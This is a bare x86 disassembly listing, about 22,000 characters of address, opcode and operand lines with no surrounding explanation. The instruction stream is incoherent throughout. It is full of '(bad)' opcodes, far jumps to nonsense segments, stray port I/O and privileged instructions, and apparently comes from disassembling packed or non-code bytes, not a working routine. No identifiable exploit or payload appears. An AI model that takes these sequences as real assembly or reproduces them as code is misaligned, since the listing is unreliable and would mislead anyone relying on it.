  41e45c:	imul   edi,DWORD PTR [ecx+0x6721aa16],0x64
  41e463:	push   0xb73c4ca8
  41e468:	and    eax,0xd4913c62
  41e46d:	xchg   BYTE PTR [ecx],ch
  41e46f:	clc    
  41e470:	jmp    0x1946:0x1fba118a
  41e477:	mov    ds:0xae7cc50f,eax
  41e47c:	sbb    dl,dl
  41e47e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e47f:	jmp    0x41e409
  41e481:	xor    dl,bl
  41e483:	imul   ebx,DWORD PTR [esi+ecx*4+0x43ef4414],0xffffff9f
  41e48b:	js     0x41e454
  41e48d:	ds push eax
  41e48f:	jecxz  0x41e4e3
  41e491:	and    al,0xd7
  41e493:	jmp    DWORD PTR [edi-0xb57d8b4]
  41e499:	fnsave [ebx+0x7230c406]
  41e49f:	stos   DWORD PTR es:[edi],eax
  41e4a0:	push   cs
  41e4a1:	fisub  WORD PTR [ecx-0x79]
  41e4a4:	inc    esp
  41e4a5:	mov    ah,0x63
  41e4a7:	std    
  41e4a8:	sar    DWORD PTR [eax],1
  41e4aa:	pop    eax
  41e4ab:	ret    
  41e4ac:	popf   
  41e4ad:	cmp    BYTE PTR [edi],ah
  41e4af:	test   ebx,0x629d52be
  41e4b5:	push   0x5be80d98
  41e4ba:	outs   dx,DWORD PTR ds:[esi]
  41e4bb:	rol    BYTE PTR [edi+0x2cc8145f],cl
  41e4c1:	and    dl,al
  41e4c3:	ret    0x73c
  41e4c6:	ins    BYTE PTR es:[edi],dx
  41e4c7:	push   edx
  41e4c8:	fsubrp st(1),st
  41e4ca:	sub    BYTE PTR [ebp+0x6a0b1b82],cl
  41e4d0:	lea    edx,[ebp+ecx*1-0x6d9d85bc]
  41e4d7:	mov    eax,ds:0x83defc32
  41e4dc:	ret    
  41e4dd:	(bad)  
  41e4df:	sar    BYTE PTR [ebx-0x39],cl
  41e4e2:	cld    
  41e4e3:	sbb    DWORD PTR [edx-0x5ac34e00],ebp
  41e4e9:	cmp    eax,0xd0dca2a5
  41e4ee:	scas   al,BYTE PTR es:[edi]
  41e4ef:	jle    0x41e565
  41e4f1:	ins    BYTE PTR es:[edi],dx
  41e4f2:	pop    ds
  41e4f3:	pop    es
  41e4f4:	pop    ecx
  41e4f5:	mov    ebx,0xadabcd85
  41e4fa:	pop    esi
  41e4fb:	inc    edx
  41e4fc:	call   0xb000:0xa8da58
  41e503:	xor    edi,DWORD PTR [edx]
  41e505:	test   eax,0x3bb3a9bb
  41e50a:	test   DWORD PTR [edi-0x5640f342],esi
  41e510:	std    
  41e511:	mov    dh,0x94
  41e513:	pop    ebx
  41e514:	add    DWORD PTR [eax],eax
  41e516:	add    eax,DWORD PTR es:[eax]
  41e519:	add    BYTE PTR [eax],ah
  41e51b:	sbb    al,0x70
  41e51d:	in     eax,0x29
  41e51f:	dec    esp
  41e520:	jg     0x41e517
  41e522:	xchg   BYTE PTR [eax],ah
  41e524:	in     eax,dx
  41e525:	sbb    BYTE PTR [esi],0x9f
  41e528:	push   esp
  41e529:	or     al,0xf1
  41e52b:	stc    
  41e52c:	cdq    
  41e52d:	arpl   cx,dx
  41e52f:	or     BYTE PTR [edi],dl
  41e531:	jl     0x93b06fae
  41e537:	jb     0x41e4e7
  41e539:	rol    ecx,cl
  41e53b:	sbb    eax,0xe597f88a
  41e540:	mov    ?,ecx
  41e542:	mov    ds,WORD PTR [ecx-0x10a9a06c]
  41e548:	inc    edi
  41e549:	in     eax,0x73
  41e54b:	ja     0x41e58d
  41e54d:	mov    ds:0xb6af79bb,eax
  41e552:	mov    esp,0x475f1598
  41e557:	test   eax,0xd2f5040c
  41e55c:	dec    edx
  41e55d:	fwait
  41e55e:	pop    DWORD PTR [ebx]
  41e560:	fdiv   QWORD PTR [ebx]
  41e562:	or     DWORD PTR [ebx],eax
  41e564:	in     eax,0x5c
  41e566:	fimul  DWORD PTR [edx+0x653070ba]
  41e56c:	xchg   esp,eax
  41e56d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e56e:	pop    ds
  41e56f:	and    BYTE PTR [edx],ah
  41e571:	push   ebx
  41e572:	out    0x2d,al
  41e574:	sar    DWORD PTR [ecx+0x4e2a4140],cl
  41e57a:	(bad)  
  41e57b:	out    0x66,al
  41e57d:	scas   eax,DWORD PTR es:[edi]
  41e57e:	fstp   DWORD PTR [edi]
  41e580:	xchg   BYTE PTR [ebx-0x5d14ae47],dh
  41e586:	mov    al,0xb5
  41e588:	jmp    0xfdef:0x60ac3e79
  41e58f:	mov    al,ds:0x6990906d
  41e594:	sahf   
  41e595:	pop    edi
  41e596:	test   DWORD PTR [ebp+eax*4+0xb],edi
  41e59a:	mov    eax,ds:0x8612644d
  41e59f:	adc    DWORD PTR ss:[edi+esi*1],ecx
  41e5a3:	or     esp,edi
  41e5a5:	pand   mm4,QWORD PTR [ebp+0x24]
  41e5a9:	in     eax,0xd8
  41e5ab:	icebp  
  41e5ac:	xor    eax,0xc4a8660b
  41e5b1:	(bad)  
  41e5b2:	imul   ebp,DWORD PTR ds:0xf64c9423,0xac32e405
  41e5bc:	or     BYTE PTR [ecx-0x4c620a04],ah
  41e5c2:	add    edx,edi
  41e5c4:	bound  edi,QWORD PTR [ebp-0x36]
  41e5c7:	inc    ebx
  41e5c8:	add    BYTE PTR [edi],ch
  41e5ca:	retf   
  41e5cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5cc:	aam    0xa9
  41e5ce:	jae    0x41e5f9
  41e5d0:	xor    ebx,DWORD PTR [esi+0x0]
  41e5d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5d4:	dec    eax
  41e5d5:	pushf  
  41e5d6:	je     0x41e60b
  41e5d8:	fisubr WORD PTR ss:[eax-0x4]
  41e5dc:	add    al,0xd0
  41e5de:	sub    ch,BYTE PTR [ecx]
  41e5e0:	inc    edi
  41e5e1:	adc    dl,BYTE PTR [ebx]
  41e5e3:	dec    ecx
  41e5e4:	fisub  WORD PTR [ecx]
  41e5e6:	mov    ds:0x123a9d78,al
  41e5eb:	mov    al,ds:0x63a099ef
  41e5f0:	lahf   
  41e5f1:	pop    ds
  41e5f2:	sbb    edi,ebx
  41e5f4:	mov    esp,0xc27d5c77
  41e5f9:	lea    ebp,[edx+0x43]
  41e5fc:	dec    DWORD PTR [ebp+0x6a]
  41e5ff:	xor    edi,eax
  41e601:	xchg   edi,eax
  41e602:	int3   
  41e603:	fwait
  41e604:	push   edx
  41e605:	xchg   esp,eax
  41e606:	int3   
  41e607:	jne    0x41e658
  41e609:	nop
  41e60a:	or     bh,BYTE PTR [eax-0x36]
  41e60d:	or     edi,DWORD PTR [eax]
  41e60f:	aad    0x27
  41e611:	shl    ah,0xdf
  41e614:	cmp    al,0xf3
  41e616:	mov    WORD PTR [ecx],ss
  41e618:	cdq    
  41e619:	push   ebp
  41e61a:	ss push edx
  41e61c:	js     0x41e685
  41e61e:	sub    DWORD PTR [esp+esi*2+0x2b],esi
  41e622:	test   DWORD PTR ds:[ecx+0x49fba387],ecx
  41e629:	mov    esp,0x8a667407
  41e62e:	(bad)  
  41e62f:	arpl   WORD PTR [ebx+0x32],dx
  41e632:	jo     0x41e664
  41e634:	dec    eax
  41e635:	or     DWORD PTR [ebx-0x7b],ecx
  41e638:	add    dl,BYTE PTR [ecx+0x39ae6c97]
  41e63e:	inc    ecx
  41e63f:	mov    eax,ds:0xafeb30c1
  41e644:	pop    ebp
  41e645:	pop    esp
  41e646:	push   edi
  41e647:	(bad)  
  41e648:	ficom  WORD PTR [esi+0xe]
  41e64b:	pop    edi
  41e64c:	fsub   DWORD PTR [eax-0x53d27044]
  41e652:	jno    0x41e5e8
  41e654:	or     DWORD PTR [esi+eiz*8],ebp
  41e657:	xor    DWORD PTR [esi+0x59],esi
  41e65a:	mov    al,ds:0x850a73d6
  41e65f:	dec    eax
  41e660:	xchg   esp,eax
  41e661:	lock jo 0x41e639
  41e664:	cmp    DWORD PTR [ebx-0x2c851ed6],edx
  41e66a:	xchg   ebx,eax
  41e66b:	push   eax
  41e66c:	inc    edi
  41e66d:	push   cs
  41e66e:	jmp    0x916e:0x9535dfef
  41e675:	inc    eax
  41e676:	dec    ebp
  41e677:	pop    ebx
  41e678:	mov    esp,DWORD PTR [edi-0x38a7955d]
  41e67e:	xchg   BYTE PTR [edi-0x1113e7b4],dh
  41e684:	pop    edi
  41e685:	mov    ebp,0x54a694fa
  41e68a:	fsub   DWORD PTR [esi+0x31dd5e97]
  41e690:	ja     0x41e619
  41e692:	add    DWORD PTR [esi-0x1f],esi
  41e695:	mov    ebx,0xfe80515c
  41e69a:	cmp    DWORD PTR [eax-0x29],ebx
  41e69d:	popa   
  41e69e:	rcr    al,0xdc
  41e6a1:	mov    ah,0x77
  41e6a3:	shl    al,1
  41e6a5:	jg     0x41e632
  41e6a7:	lahf   
  41e6a8:	repnz aad 0xf0
  41e6ab:	enter  0x5536,0x6
  41e6af:	mul    BYTE PTR [ebx+0x71c0788]
  41e6b5:	mov    edi,0x41dfcf15
  41e6ba:	jmp    0x1ecd9f62
  41e6bf:	dec    esi
  41e6c0:	sbb    dl,ch
  41e6c2:	sub    BYTE PTR [edx-0x70],bl
  41e6c5:	ret    0x5065
  41e6c8:	rcl    DWORD PTR [ecx],0x9a
  41e6cb:	sub    ebp,DWORD PTR [ebp+0x71fd6454]
  41e6d1:	test   DWORD PTR [ecx-0x399ab60d],esp
  41e6d7:	lock mov dh,0x91
  41e6da:	aaa    
  41e6db:	imul   BYTE PTR ds:0xc357c4e5
  41e6e1:	pop    ecx
  41e6e2:	and    edx,DWORD PTR [ebx+0x6abd3692]
  41e6e8:	bound  ebp,QWORD PTR [esi-0x2b77e56a]
  41e6ee:	jmp    0x4799d10a
  41e6f3:	pop    ecx
  41e6f4:	add    al,ch
  41e6f6:	and    DWORD PTR [eax-0xb],esi
  41e6f9:	in     al,dx
  41e6fa:	test   eax,0x7108f963
  41e6ff:	jne    0x41e6ca
  41e701:	(bad)  
  41e702:	mov    ah,BYTE PTR [ebx]
  41e704:	retf   
  41e705:	cs mov edx,0x2f79a64b
  41e70b:	test   bh,ah
  41e70d:	inc    ebp
  41e70e:	push   ebx
  41e70f:	jne    0x41e6d0
  41e711:	add    al,0x9d
  41e713:	jbe    0x41e6ea
  41e715:	mov    cl,0xe6
  41e717:	push   esp
  41e718:	adc    dh,ah
  41e71a:	std    
  41e71b:	mov    BYTE PTR [edi],ch
  41e71d:	and    dh,bl
  41e71f:	fwait
  41e720:	ss imul esi,ecx,0x2
  41e724:	mov    cl,0xe7
  41e726:	or     DWORD PTR [ecx-0x23],edi
  41e729:	push   esp
  41e72a:	cmp    BYTE PTR [ebp-0x72],cl
  41e72d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e72e:	out    0xf0,eax
  41e730:	xor    DWORD PTR [ecx+0x18118094],esp
  41e736:	xor    eax,0xca84663a
  41e73b:	jecxz  0x41e76c
  41e73d:	rcr    ebx,0xc5
  41e740:	jle    0x41e6e9
  41e742:	pushf  
  41e743:	(bad)  
  41e744:	jnp    0x41e7a6
  41e746:	jmp    0x41e71e
  41e748:	ret    
  41e749:	push   ebx
  41e74a:	outs   dx,BYTE PTR ds:[esi]
  41e74b:	jno    0x41e765
  41e74d:	fwait
  41e74e:	icebp  
  41e74f:	inc    edi
  41e750:	mov    al,0x42
  41e752:	jle    0x41e780
  41e754:	lods   eax,DWORD PTR ds:[esi]
  41e755:	xor    eax,0x6c6acb05
  41e75a:	push   esi
  41e75b:	or     BYTE PTR [edi+0x37],0x29
  41e75f:	fcmovnu st,st(4)
  41e761:	out    0xaa,al
  41e763:	ds retf 
  41e765:	adc    eax,0x1172dc13
  41e76a:	ja     0x41e7ba
  41e76c:	fwait
  41e76d:	push   0xa27c05ab
  41e772:	into   
  41e773:	std    
  41e774:	mov    ebx,0xad4b191e
  41e779:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e77a:	(bad)  
  41e77b:	pop    edi
  41e77c:	fidiv  DWORD PTR [eax-0xb]
  41e77f:	les    ecx,FWORD PTR [edx-0x5c]
  41e782:	rcl    BYTE PTR [edx+0x41],cl
  41e785:	jbe    0x41e7d2
  41e787:	in     al,dx
  41e788:	ds xchg edx,eax
  41e78a:	rcl    BYTE PTR [esi+0x14a9c13e],1
  41e790:	sub    BYTE PTR [esi],0x16
  41e793:	mov    dl,0x5c
  41e795:	jbe    0x41e806
  41e797:	enter  0xd7a,0xf9
  41e79b:	sbb    ah,ch
  41e79d:	bound  ecx,QWORD PTR ds:[eax+0x5a2541f2]
  41e7a4:	std    
  41e7a5:	test   BYTE PTR [eax],al
  41e7a7:	daa    
  41e7a8:	inc    ebp
  41e7a9:	xchg   edi,edi
  41e7ab:	lea    ebp,[edi]
  41e7ad:	fdivrp st(5),st
  41e7af:	mov    ch,0xd5
  41e7b1:	mov    dh,0x24
  41e7b3:	inc    ecx
  41e7b4:	adc    DWORD PTR [edx+0x7e72c7e6],ebp
  41e7ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7bb:	mov    ch,0xac
  41e7bd:	inc    ecx
  41e7be:	inc    ebp
  41e7bf:	cmp    BYTE PTR [edx+0xf],0xe9
  41e7c3:	rcl    BYTE PTR [ecx*8+0x2b5e2618],0x6d
  41e7cb:	out    dx,al
  41e7cc:	aam    0xc0
  41e7ce:	sti    
  41e7cf:	push   0xffffffb5
  41e7d1:	and    eax,0xea8edb35
  41e7d6:	in     eax,dx
  41e7d7:	fcomp  QWORD PTR [eax]
  41e7d9:	sbb    dh,BYTE PTR [eax-0x1967618d]
  41e7df:	mov    eax,0x2a22891d
  41e7e4:	jns    0x41e848
  41e7e6:	dec    ecx
  41e7e7:	add    esp,ebp
  41e7e9:	mov    eax,ds:0x1e7ff01
  41e7ee:	les    ebp,FWORD PTR [esi]
  41e7f0:	mov    cl,0xed
  41e7f2:	mov    ds:0x4c9fa4a1,eax
  41e7f7:	xchg   esi,eax
  41e7f8:	mov    ecx,0xfe00b8ef
  41e7fd:	(bad)  
  41e7fe:	pusha  
  41e7ff:	mov    al,0x9c
  41e801:	xor    eax,0x55c8a848
  41e806:	mov    cl,0x2d
  41e808:	and    eax,0xe92a62d5
  41e80d:	fbld   TBYTE PTR [eax-0x2b]
  41e810:	sahf   
  41e811:	test   eax,0x453375f3
  41e816:	imul   esi,DWORD PTR [eax],0x9dde219
  41e81c:	dec    eax
  41e81d:	mov    al,ds:0x875fcf0e
  41e822:	sub    eax,0x43b6b754
  41e827:	aaa    
  41e828:	cwde   
  41e829:	pop    ds
  41e82a:	inc    eax
  41e82b:	xor    ah,0xe4
  41e82e:	inc    ebp
  41e82f:	pop    ss
  41e830:	mov    ah,0x84
  41e832:	pop    ebp
  41e833:	mov    bl,0x22
  41e835:	ins    DWORD PTR es:[edi],dx
  41e836:	call   0xce20b37
  41e83b:	xchg   esp,eax
  41e83c:	push   eax
  41e83d:	clc    
  41e83e:	jmp    0xa941e875
  41e843:	pop    esi
  41e844:	leave  
  41e845:	xchg   esp,eax
  41e846:	call   DWORD PTR [edi-0x1bf58003]
  41e84c:	cdq    
  41e84d:	pop    ecx
  41e84e:	jp     0x41e853
  41e850:	jae    0x41e8a8
  41e852:	mov    edx,0x2600015e
  41e857:	add    eax,DWORD PTR [eax]
  41e859:	add    BYTE PTR [eax+0x7a],bh
  41e85c:	ret    
  41e85d:	sbb    al,0xd4
  41e85f:	jo     0x41e89c
  41e861:	inc    ebx
  41e862:	in     eax,0xcf
  41e864:	aas    
  41e865:	dec    eax
  41e866:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41e868:	or     ah,ch
  41e86a:	call   0xa406:0x181f1a2e
  41e871:	cmovno edx,DWORD PTR [esi+0x6c5a4e61]
  41e878:	cli    
  41e879:	arpl   WORD PTR [edi+ecx*2+0x2f],bx
  41e87d:	sbb    edi,DWORD PTR ds:0x18784273
  41e883:	test   DWORD PTR [edi-0x17e616ab],0xf153a3f2
  41e88d:	push   cs
  41e88e:	mov    eax,ds:0x6f3b5439
  41e893:	mov    cl,0x57
  41e895:	out    dx,eax
  41e896:	xchg   BYTE PTR fs:[ebx+0x31],cl
  41e89a:	mov    ds:0x1800cde1,al
  41e89f:	test   DWORD PTR [ebx+0x445b7ab3],ebp
  41e8a5:	loopne 0x41e8a6
  41e8a7:	lock or DWORD PTR [eax-0x1c],edx
  41e8ab:	les    ecx,FWORD PTR [edx+edx*8]
  41e8ae:	fwait
  41e8af:	xchg   edi,eax
  41e8b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8b1:	dec    eax
  41e8b2:	repz mov dh,0x8e
  41e8b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8b6:	push   ds
  41e8b7:	sbb    DWORD PTR [ebx-0x6e],0xffffffab
  41e8bb:	nop
  41e8bc:	push   ecx
  41e8bd:	inc    esi
  41e8be:	xchg   esp,eax
  41e8bf:	bound  ebp,QWORD PTR [edx+0x48d91f34]
  41e8c5:	mov    eax,0x106003d2
  41e8ca:	dec    esp
  41e8cb:	shl    DWORD PTR [ebx],0x81
  41e8ce:	mov    gs,edx
  41e8d0:	movzx  eax,di
  41e8d3:	imul   ebp,DWORD PTR [edi+eiz*8],0x53
  41e8d7:	xchg   esi,eax
  41e8d8:	and    eax,0x4345a917
  41e8dd:	push   edi
  41e8de:	xchg   ebp,eax
  41e8df:	ins    DWORD PTR es:[edi],dx
  41e8e0:	xabort 0xf2
  41e8e3:	mov    bl,0x60
  41e8e5:	out    dx,al
  41e8e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8e7:	inc    esi
  41e8e8:	xlat   BYTE PTR ds:[ebx]
  41e8e9:	mov    cl,0x41
  41e8eb:	xor    bl,al
  41e8ed:	ins    DWORD PTR es:[edi],dx
  41e8ee:	aaa    
  41e8ef:	pop    ebx
  41e8f0:	retf   
  41e8f1:	stc    
  41e8f2:	gs push 0x1c
  41e8f5:	int3   
  41e8f6:	pop    es
  41e8f7:	sub    edx,DWORD PTR [esi+0x52e1cf40]
  41e8fd:	xlat   BYTE PTR ds:[ebx]
  41e8fe:	or     DWORD PTR [edi],edx
  41e900:	jno    0x41e8d9
  41e902:	add    al,0x78
  41e904:	sbb    bl,bh
  41e906:	ss lahf 
  41e908:	inc    ebp
  41e909:	adc    al,0x12
  41e90b:	in     eax,0x2
  41e90d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e90e:	retf   0xed71
  41e911:	cli    
  41e912:	loopne 0x41e90e
  41e914:	outs   dx,DWORD PTR ds:[esi]
  41e915:	ins    BYTE PTR es:[edi],dx
  41e916:	loopne 0x41e94d
  41e918:	cmp    dl,ch
  41e91a:	(bad)  [edi+0x3eea0bdf]
  41e920:	add    eax,0x93c74bb8
  41e925:	cmp    DWORD PTR [ecx-0x1c87a23b],ecx
  41e92b:	sbb    BYTE PTR [ebx+0x46],bl
  41e92e:	js     0x41e8d1
  41e930:	loop   0x41e921
  41e932:	pop    ebp
  41e933:	pop    eax
  41e934:	in     eax,dx
  41e935:	jmp    0x9a62923e
  41e93a:	icebp  
  41e93b:	mov    dh,0x4f
  41e93d:	xor    DWORD PTR [ecx+0x5f4b452b],esp
  41e943:	pop    edi
  41e944:	stos   BYTE PTR es:[edi],al
  41e945:	push   edx
  41e946:	loopne 0x41e8d2
  41e948:	or     eax,0x640562f0
  41e94d:	or     ecx,DWORD PTR [esi-0x415dd624]
  41e953:	sbb    ch,BYTE PTR [ebx-0x674e5104]
  41e959:	xchg   edi,eax
  41e95a:	lahf   
  41e95b:	mov    bh,0xf1
  41e95d:	je     0x41e8f8
  41e95f:	pop    ds
  41e960:	fwait
  41e961:	imul   edi,ebx,0xf951925e
  41e967:	sub    ah,BYTE PTR [ecx+0x5cd71f6a]
  41e96d:	or     dh,BYTE PTR [edx+0x2d]
  41e970:	or     ecx,eax
  41e972:	sar    eax,cl
  41e974:	add    bl,BYTE PTR ds:0x14b75a4
  41e97a:	dec    edi
  41e97b:	cmc    
  41e97c:	xchg   edi,eax
  41e97d:	cmp    bh,ah
  41e97f:	clc    
  41e980:	or     bh,bh
  41e982:	mov    ds:0x9fcf8b10,al
  41e987:	retf   0x2a87
  41e98a:	outs   dx,BYTE PTR ds:[esi]
  41e98b:	stos   BYTE PTR es:[edi],al
  41e98c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e98d:	lods   eax,DWORD PTR ds:[esi]
  41e98e:	lea    esp,[eax+esi*1]
  41e991:	imul   ebp,DWORD PTR [esi],0x936f1d4
  41e997:	inc    edi
  41e998:	jo     0x41e9fb
  41e99a:	out    0x48,al
  41e99c:	adc    ecx,DWORD PTR [eax]
  41e99e:	loopne 0x41e9e7
  41e9a0:	pop    edi
  41e9a1:	fsubr  st,st(4)
  41e9a3:	sbb    eax,0x6ef5530e
  41e9a8:	repz mov eax,ds:0x5725498e
  41e9ae:	inc    edi
  41e9af:	xor    ebp,esp
  41e9b1:	pop    eax
  41e9b2:	or     al,0xe4
  41e9b4:	out    0x1f,eax
  41e9b6:	gs jmp 0x41e9d7
  41e9b9:	(bad)  
  41e9ba:	jo     0x41e9b7
  41e9bc:	xor    dl,BYTE PTR [ebx-0x795b35de]
  41e9c2:	loope  0x41e9e6
  41e9c4:	fwait
  41e9c5:	mov    edi,0x34973477
  41e9ca:	call   0xbd73:0xccc0f3e7
  41e9d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9d2:	inc    eax
  41e9d3:	jno    0x41e987
  41e9d5:	(bad)  
  41e9d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9d7:	sbb    DWORD PTR [esi-0x6cf02a97],eax
  41e9dd:	mov    bl,0xfa
  41e9df:	inc    esp
  41e9e0:	xchg   ebp,eax
  41e9e1:	inc    esp
  41e9e2:	fxch   st(7)
  41e9e4:	mov    al,ds:0xc390c8a6
  41e9e9:	ins    BYTE PTR es:[edi],dx
  41e9ea:	test   DWORD PTR [edx-0x125b2357],ebp
  41e9f0:	or     BYTE PTR [eax],dh
  41e9f2:	mov    ebx,0x60903b02
  41e9f7:	in     al,dx
  41e9f8:	ins    BYTE PTR es:[edi],dx
  41e9f9:	retf   0x2c94
  41e9fc:	(bad)
  41e9ff:	pop    ebp
  41ea00:	popa   
  41ea01:	dec    ebx
  41ea03:	mov    bl,0xf6
  41ea05:	adc    al,0x54
  41ea07:	dec    esi
  41ea08:	out    0x3d,al
  41ea0a:	push   ds
  41ea0b:	mov    bh,0x16
  41ea0d:	xlat   BYTE PTR ds:[ebx]
  41ea0e:	xchg   ebx,eax
  41ea0f:	out    dx,al
  41ea10:	sbb    ebp,DWORD PTR [ebx-0x19]
  41ea13:	push   es
  41ea14:	push   ds
  41ea15:	push   esp
  41ea16:	mov    WORD PTR [eax+ecx*4-0xd],gs
  41ea1a:	jns    0x41e9c9
  41ea1c:	bound  ebx,QWORD PTR [edi+0x4b506042]
  41ea22:	lahf   
  41ea23:	pushf  
  41ea24:	lock mov ah,0xf
  41ea27:	dec    eax
  41ea28:	sbb    bl,BYTE PTR [ebp-0x7f]
  41ea2b:	js     0x41ea23
  41ea2d:	mov    edx,0x8fcc0a23
  41ea32:	push   esi
  41ea33:	add    dl,BYTE PTR [esi+0xe]
  41ea36:	out    0x37,eax
  41ea38:	mov    ebx,0x8731772a
  41ea3d:	add    eax,0x44979ea7
  41ea42:	sahf   
  41ea43:	xchg   ebx,eax
  41ea44:	cli    
  41ea45:	pusha  
  41ea46:	cs mov al,0xc4
  41ea49:	imul   ebp,DWORD PTR [edi+0x46],0x5b162334
  41ea50:	pop    esi
  41ea51:	out    dx,eax
  41ea52:	aam    0x5
  41ea54:	mov    DWORD PTR [eax+0x18],ecx
  41ea57:	mov    esp,0xe3322b44
  41ea5c:	cdq    
  41ea5d:	xor    eax,0xe5080413
  41ea62:	aam    0x72
  41ea64:	push   eax
  41ea65:	loopne 0x41eaae
  41ea67:	lahf   
  41ea68:	mov    dh,0x86
  41ea6a:	leave  
  41ea6b:	push   esi
  41ea6c:	pop    esp
  41ea6d:	aaa    
  41ea6e:	stos   BYTE PTR es:[edi],al
  41ea6f:	test   DWORD PTR [esi-0x715f9a62],ecx
  41ea75:	(bad)  
  41ea76:	movups xmm0,xmm3
  41ea79:	jle    0x41ea66
  41ea7b:	imul   BYTE PTR [edx]
  41ea7d:	stos   DWORD PTR es:[edi],eax
  41ea7e:	retf   0x5811
  41ea81:	aam    0x3d
  41ea83:	push   ecx
  41ea84:	cmc    
  41ea85:	imul   ebx,edi,0xbca129d3
  41ea8b:	sub    eax,0x23a35110
  41ea90:	inc    esp
  41ea91:	dec    edi
  41ea92:	pop    edx
  41ea93:	in     al,dx
  41ea94:	cmp    esi,DWORD PTR [ebp+0x697c1131]
  41ea9a:	add    esp,edi
  41ea9c:	cmp    al,0x9a
  41ea9e:	pop    edx
  41ea9f:	sbb    bl,BYTE PTR [eax]
  41eaa1:	sub    dl,BYTE PTR [edx+0xf25210]
  41eaa7:	inc    ebp
  41eaa8:	jmp    0x41ea85
  41eaaa:	imul   esp,DWORD PTR [ebp-0x6c],0x2
  41eaae:	push   ebx
  41eaaf:	arpl   bp,di
  41eab1:	test   eax,0x7b4da307
  41eab6:	cmp    eax,DWORD PTR [edi-0x41ca4075]
  41eabc:	push   edx
  41eabd:	inc    ecx
  41eabe:	sub    al,0x37
  41eac0:	sub    eax,DWORD PTR [ecx-0x38]
  41eac3:	call   0x8efe:0x1a15e49
  41eaca:	cmp    esi,DWORD PTR [esi-0x18]
  41eacd:	add    DWORD PTR [ecx+0x53],edx
  41ead0:	leave  
  41ead1:	pop    ebx
  41ead2:	mov    ebx,0xcbb58d1f
  41ead7:	xor    bl,BYTE PTR ds:0xe8384055
  41eadd:	adc    BYTE PTR [ebx-0x79f05663],ch
  41eae3:	push   0xfffffffd
  41eae5:	xchg   ebx,eax
  41eae6:	sbb    bl,bl
  41eae8:	push   ebp
  41eae9:	inc    BYTE PTR [esi]
  41eaeb:	cwde   
  41eaec:	dec    eax
  41eaed:	leave  
  41eaee:	push   0xe860961c
  41eaf3:	jo     0x41eb2e
  41eaf5:	and    eax,0x88c5235c
  41eafa:	cmp    bh,bl
  41eafc:	jmp    0x41eaff
  41eafe:	jmp    0x93763493
  41eb03:	imul   ecx,eax,0xcfa46336
  41eb09:	enter  0x6f16,0xc0
  41eb0d:	rol    DWORD PTR [edi+0x35c98ee0],1
  41eb13:	and    bl,BYTE PTR [ebx+ebp*1-0x78]
  41eb17:	pop    esi
  41eb18:	neg    BYTE PTR [ebx-0x391ec02c]
  41eb1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb1f:	icebp  
  41eb20:	mov    eax,0x3b23d1c0
  41eb25:	imul   ebp,ebp,0xf940438e
  41eb2b:	sub    bh,BYTE PTR [ebx-0x1bdca62d]
  41eb31:	shr    DWORD PTR [eax-0x4b],1
  41eb34:	sar    BYTE PTR [esi],1
  41eb36:	add    BYTE PTR [ebp-0x44],ch
  41eb39:	repnz sub BYTE PTR [ebx+0x63a32079],al
  41eb40:	out    dx,eax
  41eb41:	pop    ds
  41eb42:	mov    al,ds:0x7497ee85
  41eb47:	dec    ebx
  41eb48:	pop    ecx
  41eb49:	push   edi
  41eb4a:	jecxz  0x41eb7b
  41eb4c:	shl    DWORD PTR [edi-0x471266f6],0x7b
  41eb53:	sub    DWORD PTR [edi],ebx
  41eb55:	mov    edx,0x4aa54dd0
  41eb5a:	repz leave 
  41eb5c:	(bad)  
  41eb5d:	scas   eax,DWORD PTR es:[edi]
  41eb5e:	adc    al,0xaa
  41eb60:	push   eax
  41eb61:	loopne 0x41eb06
  41eb63:	ds jecxz 0x41eb27
  41eb66:	xchg   BYTE PTR [ebx-0x1be81d92],cl
  41eb6c:	fwait
  41eb6d:	clc    
  41eb6e:	push   ds
  41eb6f:	xchg   ebp,eax
  41eb70:	fs leave 
  41eb72:	cmp    eax,0xa6d0a614
  41eb77:	test   DWORD PTR [edi-0x1e],edi
  41eb7a:	push   0x241f10b3
  41eb7f:	pop    es
  41eb80:	add    BYTE PTR [eax],al
  41eb82:	mov    ebx,0x7d7539cf
  41eb87:	idiv   edi
  41eb89:	iret   
  41eb8a:	std    
  41eb8b:	mov    ecx,DWORD PTR [esi-0xf8508f1]
  41eb91:	in     eax,dx
  41eb92:	loopne 0x41ebf5
  41eb94:	add    DWORD PTR [eax],eax
  41eb96:	add    eax,DWORD PTR es:[eax]
  41eb99:	add    BYTE PTR [edi],dh
  41eb9b:	xor    BYTE PTR [esi],0x95
  41eb9e:	and    ch,cl
  41eba0:	mov    ebx,0x93368992
  41eba5:	mov    eax,esi
  41eba7:	retf   0xa7c0
  41ebaa:	ret    0xe8b
  41ebad:	js     0x41eb47
  41ebaf:	pop    ss
  41ebb0:	lock adc DWORD PTR [ecx-0x63a841be],0x71
  41ebb8:	push   edx
  41ebb9:	pop    edx
  41ebba:	pop    edi
  41ebbb:	nop
  41ebbc:	inc    ecx
  41ebbd:	inc    edi
  41ebbe:	push   ebp
  41ebbf:	inc    eax
  41ebc0:	in     eax,dx
  41ebc1:	les    edx,FWORD PTR [eax-0x3ec66459]
  41ebc7:	scas   al,BYTE PTR es:[edi]
  41ebc8:	mov    edx,0x1298e344
  41ebcd:	jnp    0x41ebac
  41ebcf:	(bad)  
  41ebd0:	sbb    BYTE PTR [edi+0x67526d6b],al
  41ebd6:	inc    esp
  41ebd7:	sbb    al,ch
  41ebd9:	icebp  
  41ebda:	fdiv   DWORD PTR [ebx+0x11]
  41ebdd:	pop    ebx
